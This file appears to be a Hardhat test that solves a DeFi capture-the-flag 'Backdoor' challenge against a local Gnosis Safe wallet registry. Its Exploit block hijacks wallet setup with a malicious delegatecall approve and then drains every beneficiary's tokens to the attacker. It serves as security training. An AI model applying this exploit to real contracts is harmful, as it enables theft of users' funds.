const { ethers, web3 } = require('hardhat');
const { expect } = require('chai');
const { constants } = require('ethers');

describe('[Challenge] Backdoor', function () {
	let deployer, users, attacker;

	const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

	before(async function () {
		/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
		[deployer, alice, bob, charlie, david, attacker] =
			await ethers.getSigners();
		users = [alice.address, bob.address, charlie.address, david.address];

		// Deploy Gnosis Safe master copy and factory contracts
		this.masterCopy = await (
			await ethers.getContractFactory('GnosisSafe', deployer)
		).deploy();
		this.walletFactory = await (
			await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)
		).deploy();
		this.token = await (
			await ethers.getContractFactory('DamnValuableToken', deployer)
		).deploy();

		// Deploy the registry
		this.walletRegistry = await (
			await ethers.getContractFactory('WalletRegistry', deployer)
		).deploy(
			this.masterCopy.address,
			this.walletFactory.address,
			this.token.address,
			users,
		);

		// Users are registered as beneficiaries
		for (let i = 0; i < users.length; i++) {
			expect(await this.walletRegistry.beneficiaries(users[i])).to.be.true;
		}

		// Transfer tokens to be distributed to the registry
		await this.token.transfer(
			this.walletRegistry.address,
			AMOUNT_TOKENS_DISTRIBUTED,
		);
	});

	it('Exploit', async function () {
		/** CODE YOUR EXPLOIT HERE */

		const encodedApprove = web3.eth.abi.encodeFunctionCall(
			{
				type: 'function',
				name: 'approve',
				inputs: [
					{
						type: 'address',
						name: 'spender',
					},
					{
						type: 'address',
						name: 'token',
					},
				],
			},
			[attacker.address, this.token.address],
		);

		const fallBackHandler = await (
			await ethers.getContractFactory('FallbackHandler', attacker)
		).deploy();

		const setup = (addr) =>
			web3.eth.abi.encodeFunctionCall(
				{
					type: 'function',
					name: 'setup',
					inputs: [
						{
							type: 'address[]',
							name: '_owners',
						},
						{
							type: 'uint256',
							name: '_threshold',
						},
						{
							type: 'address',
							name: 'to',
						},
						{
							type: 'bytes',
							name: 'data',
						},
						{
							type: 'address',
							name: 'fallbackHandler',
						},
						{
							type: 'address',
							name: 'paymentToken',
						},
						{
							type: 'uint256',
							name: 'payment',
						},
						{
							type: 'address',
							name: 'paymentReceiver',
						},
					],
				},
				[
					[addr],
					1,
					fallBackHandler.address,
					encodedApprove,
					constants.AddressZero,
					constants.AddressZero,
					0,
					constants.AddressZero,
				],
			);

		for (let i = 0; i < users.length; i++) {
			const tx = await this.walletFactory
				.connect(attacker)
				.createProxyWithCallback(
					this.masterCopy.address,
					setup(users[i], fallBackHandler.address),
					1,
					this.walletRegistry.address,
				);
			const { events } = await tx.wait();
			const proxy = events[2].args.proxy;
			const proxyBalance = await this.token.balanceOf(proxy);
			expect(proxyBalance).to.equal(ethers.utils.parseEther('10'));

			await this.token
				.connect(attacker)
				.transferFrom(proxy, attacker.address, proxyBalance);
		}
	});

	after(async function () {
		/** SUCCESS CONDITIONS */
		for (let i = 0; i < users.length; i++) {
			let wallet = await this.walletRegistry.wallets(users[i]);

			// User must have registered a wallet
			expect(wallet).to.not.eq(
				ethers.constants.AddressZero,
				'User did not register a wallet',
			);

			// User is no longer registered as a beneficiary
			expect(await this.walletRegistry.beneficiaries(users[i])).to.be.false;
		}

		// Attacker must have taken all tokens
		expect(await this.token.balanceOf(attacker.address)).to.eq(
			AMOUNT_TOKENS_DISTRIBUTED,
		);
	});
});
